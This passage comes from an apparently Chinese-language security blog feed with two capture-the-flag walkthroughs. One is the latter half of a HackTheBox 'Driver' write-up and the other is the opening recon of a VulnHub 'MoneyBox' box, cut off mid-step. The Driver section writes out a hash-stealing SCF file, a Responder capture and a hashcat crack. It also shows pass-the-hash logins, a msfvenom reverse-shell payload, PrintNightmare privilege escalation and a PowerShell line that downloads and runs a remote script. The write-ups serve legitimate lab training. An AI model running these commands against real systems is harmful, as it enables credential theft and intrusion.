file)</h2><p>在上传了数小时的webshell后我放弃了。。。直到我重新思考了一下，前面收集到了445端口及web界面显示的<strong>文件共享</strong>字眼，我找到了SCF。<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvbmV3cy85NzI2">何为SCF文件攻击<i class="fa fa-external-link-alt"></i></span></p><p><code>创建.scf文件，文件使用@开头是为了保持文件始终在第一位，方便读取。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/driver]</span><br><span class="line">└─# cat @attack.scf </span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\your-ip\share\random.ico  //这里目录随便写不存在也可以，目的就是让目标来链接我从而获得目标的hash</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><p><code>运行Responder抓取Ntlmv2 hash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/driver/Responder-master]</span><br><span class="line">└─# python2 Responder.py -wrf --lm -v -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 2.3</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To kill this script hit CRTL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [ON]</span><br><span class="line">    Fingerprint hosts          [ON]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.2]</span><br><span class="line">    Challenge set              [1122334455667788]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Listening for events...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>上传@attack.scf即可抓取到Ntlmv2 hash，得到用户名tony</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tony::DRIVER:1122334455667788:CAB4FB213766B6C2B128BA78CAAA28BD:0101000000000000B380F2FC5FD6D701102734F8919D620700000000020000000000000000000000</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110192405051.png" class><h2 id="0x04-解密Ntlmv2-hash值"><a href="#0x04-解密Ntlmv2-hash值" class="headerlink" title="0x04.解密Ntlmv2 hash值"></a>0x04.解密Ntlmv2 hash值</h2><p><code>使用hashcat和john均可以，得到密码为liltony</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/driver]</span><br><span class="line">└─# cat hash       </span><br><span class="line">tony::DRIVER:1122334455667788:CAB4FB213766B6C2B128BA78CAAA28BD:0101000000000000B380F2FC5FD6D701102734F8919D620700000000020000000000000000000000</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110193702034.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110194448934.png" class><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05.漏洞利用"></a>0x05.漏洞利用</h2><h3 id="1-msf的auxiliary-scanner-winrm-winrm-cmd"><a href="#1-msf的auxiliary-scanner-winrm-winrm-cmd" class="headerlink" title="1.msf的auxiliary/scanner/winrm/winrm_cmd"></a>1.msf的auxiliary/scanner/winrm/winrm_cmd</h3><p><code>使用auxiliary/scanner/winrm/winrm_cmd模块执行命令，但是没有成功。</code></p><img src="/2021/11/11/HTB-driver/image-20211110202706070.png" class><h3 id="2-evil-winrm-rb利用"><a href="#2-evil-winrm-rb利用" class="headerlink" title="2.evil-winrm.rb利用"></a>2.evil-winrm.rb利用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./evil-winrm.rb -i 10.10.11.106 -u &quot;tony&quot; -p &quot;liltony&quot;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110203428500.png" class><p><code>查看user.txt</code></p><img src="/2021/11/11/HTB-driver/image-20211110203602240.png" class><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><p><code>首先生成后门文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p><code>上传并执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; upload /root/htb/driver/shell.exe</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110210457264.png" class><img src="/2021/11/11/HTB-driver/image-20211110210519502.png" class><p><code>这里迁移进程并提权，但是没有成功</code></p><img src="/2021/11/11/HTB-driver/image-20211110210749918.png" class><h2 id="0x06-CVE-2021-1675提权"><a href="#0x06-CVE-2021-1675提权" class="headerlink" title="0x06.CVE-2021-1675提权"></a>0x06.CVE-2021-1675提权</h2><p><code>由web站点可以看到这是一个打印机网站，所以查看服务器是否开启了print spooler服务</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Service -Name Spooler</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110212314383.png" class><p>可以看到打印服务开启，接下来进行利用</p><h3 id="1-第一种方式"><a href="#1-第一种方式" class="headerlink" title="1.第一种方式"></a>1.第一种方式</h3><p><strong>CVE-2021-1675.py</strong></p><p><code>首先配置smb服务，添加如下配置文件允许匿名访问</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">client min protocol = CORE</span><br><span class="line">client max protocol = SMB3</span><br><span class="line">map to guest = Bad User</span><br><span class="line">server role = standalone server</span><br><span class="line">usershare allow guests = yes</span><br><span class="line">idmap config * : backend = tdb</span><br><span class="line">smb ports = 445</span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">comment = Samba</span><br><span class="line">path = /tmp</span><br><span class="line">guest ok = yes</span><br><span class="line">read only = no</span><br><span class="line">browsable = yes</span><br><span class="line">force user = smbuser</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111132854690.png" class><p><code>使用impacket的smbserver.py脚本开启smb服务</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbserver.py smb /tmp</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111133336371.png" class><p><code>CS生成木马，使用CVE-2021-1675.py利用浏览本机共享文件，需要将生成的木马文件放到之前设置的共享目录/tmp下</code></p><img src="/2021/11/11/HTB-driver/image-20211111135212474.png" class><p><code>接下来浏览共享文件driver.dll即可上线。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021–1675.py driver.htb/tony:liltony@10.10.11.106 &#x27;\\10.10.16.5\smb\driver.dll&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111135324817.png" class><img src="/2021/11/11/HTB-driver/image-20211111135358519.png" class><img src="/2021/11/11/HTB-driver/image-20211111135939797.png" class><img src="/2021/11/11/HTB-driver/image-20211111141208240.png" class><p><code>得到system32权限就可以获取hash值，可以爆破NTLM值得到明文密码，也可以使用win-rm使用hash进行登入</code></p><p>我这里没有破解成功！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./evil-winrm.rb -i 10.10.11.106 -u &quot;administrator&quot; -H &quot;d1256cff8b5b5fdb8c327d3b6c3f5017&quot;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111141126839.png" class><h3 id="2-第二种方式"><a href="#2-第二种方式" class="headerlink" title="2.第二种方式"></a>2.第二种方式</h3><p><strong>CVE-2021-1675.ps1</strong></p><p><code>利用powershell脚本创建一个新的管理员用户</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\CVE-2021-1675.ps1</span><br><span class="line">Invoke-Nightmare -NewUser &quot;demo&quot; -NewPassword &quot;demo&quot; </span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111122811651.png" class><p><code>导入模块的时候可以看到powershell脚本的执行权限为默认不执行任何脚本，接下来进行bypass</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(new-object net.webclient).downloadstring(&#x27;http://your_ip/CVE-2021-1675.ps1&#x27;)</span><br></pre></td></tr></table></figure><p><code>成功创建用户</code></p><img src="/2021/11/11/HTB-driver/image-20211111123953437.png" class><p><code>demo:demo登入</code></p><img src="/2021/11/11/HTB-driver/image-20211111125319882.png" class><p><code>得到root.txt</code></p><img src="/2021/11/11/HTB-driver/image-20211111125655214.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/11/11/HTB-driver/image-20211110125701582.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MoneyBox</title>
    <link href="https://lunamoore.github.io/2021/10/26/MoneyBox/"/>
    <id>https://lunamoore.github.io/2021/10/26/MoneyBox/</id>
    <published>2021-10-26T09:13:15.000Z</published>
    <updated>2021-10-26T09:16:29.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><blockquote><p>Difficulty : Easy</p><p>Goal : 3 flags</p><p>一台CTF风靶机。veryveryvery<del>~</del>ez</p></blockquote><a id="more"></a><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01.主机发现"></a>0x01.主机发现</h2><p><code>由于是仅主机网络，所以使用arp扫描即可发现。如下，1是网关，100是DHCP服务器，所以103就是靶机IP地址。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo arp-scan 192.168.56.1/24                                                1 ⨯</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 08:00:27:43:73:bc, IPv4: 192.168.56.104</span><br><span class="line">WARNING: host part of 192.168.56.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:59:03:27       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.103  08:00:27:0f:86:5f       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.133 seconds (120.02 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02.信息收集"></a>0x02.信息收集</h2><p><code>发现了IP地址，接下来进行端口扫描。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 192.168.56.103   </span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:02 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds</span><br></pre></td></tr></table></figure><p><code>可以看到开放了21、22、80端口，接下来进行banner收集，查看每个端口对应的服务及版本信息。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sV 192.168.56.103 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:07 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds</span><br></pre></td></tr></table></figure><p><code>获取到banner信息后，可以使用-sC参数对各个端口进行默认脚本扫描，这里可以看到21端口对应的FTP服务可以进行匿名登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sC -p21,22,80 192.168.56.103</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:09 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.104</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)</span><br><span class="line">|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)</span><br><span class="line">|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-title: MoneyBox</span><br><span class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-FTP匿名登入"><a href="#0x03-FTP匿名登入" class="headerlink" title="0x03.FTP匿名登入"></a>0x03.FTP匿名登入</h2><p><code>之前获取到了FTP服务存在匿名登入，所以接下来进行登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.56.103</span><br><span class="line">Connected to 192.168.56.103.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.103:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p><code>尝试切换目录与查看文件。可以看到不能切换目录，且只有一个jpg图片，名字为trytofind视乎是在提示我们什么。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">257 &quot;/&quot; is the current directory</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><p><code>下载trytofind.jpg进行分析，图片如下，没什么可用信息！(其实还有，下一步再说:)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get trytofind.jpg</span></span><br><span class="line">local: trytofind.jpg remote: trytofind.jpg</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">1093656 bytes received in 0.05 secs (21.3356 MB/s)</span><br></pre></td></tr></table></figure><img src="/2021/10/26/MoneyBox/image-20211026145731037.png" class><h2 id="0x04-访问http服务"><a href="#0x04-访问http服务" class="headerlink" title="0x04.访问http服务"></a>0x04.访问http服务</h2><p><code>前面发现了80端口，所以这里访问http服务看看是否有利用的信息</code></p><img src="/2021/10/26/MoneyBox/image-20211026153257042.png" class><p><code>只是一个静态页面，源码也没发现什么，接下来，扫描目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ dirb http://192.168.56.103                                                        255 ⨯</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Oct 26 03:09:37 2021</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/blogs/                                                </span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:621)                                     </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:279)                                  </span><br><span class="line">                                                                                           </span><br><span class="line">---- Entering directory: http://192.168.56.103/blogs/ ----</span><br><span class="line">+ http://192.168.56.103/blogs/index.html (CODE:200|SIZE:353)                               </span><br><span class="line">                                                                                           </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Oct 26 03:09:41 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 3</span><br></pre></td></tr></table></figure><p><code>发现了blogs目录，访问它。查看源码，发现一个秘密的目录，继续访问它！</code></p><img src="/2021/10/26/MoneyBox/image-20211026153750103.png" class><p><code>这里发现一个密钥(3xtr4ctd4t4)，先留着</code></p><img src="/2021/10/26/MoneyBox/image-20211026153955789.png" class><h2 id="0x05-查看图片里隐写的信息"><a href="#0x05-查看图片里隐写的信息" class="headerlink" title="0x05.查看图片里隐写的信息"></a>0x05.查看图片里隐写的信息</h2><p>到这里，我们的测试似乎遇到了瓶颈期，但给我们的hint却是(这是一个非常容易的靶机，不要想太多)，接下来继续以图片为突破点！</p><p><code>使用strings查看图片中的字符串信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ strings trytofind.jpg | head -n 15</span><br><span class="line">JFIF</span><br><span class="line"> , #&amp;&#x27;)*)</span><br><span class="line"><span class="meta">-0-(0%</span><span class="bash">()(</span></span><br><span class="line">((((((((((((((((((((((((((((((((((((((((((((((((((</span><br><span class="line"><span class="meta">$</span><span class="bash">3br</span></span><br><span class="line"><span class="meta">%</span><span class="bash">&amp;<span class="string">&#x27;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span></span></span><br><span class="line">        #3R</span><br><span class="line">&amp;&#x27;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span><br><span class="line">p=*5$</span><br><span class="line">\sH@</span><br><span class="line"> &quot;PCv</span><br><span class="line">N&#x27; g</span><br><span class="line">.&#125;F1@</span><br><span class="line"><span class="meta">@#</span><span class="bash">u-</span></span><br><span class="line">&#125;h_n</span><br></pre></td></tr></table></figure><p><code>可以看到，这并不是一个正常的图片头，使用steghide查看图片信息，这里便使用到了前面发现的密钥(3xtr4ctd4t4)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 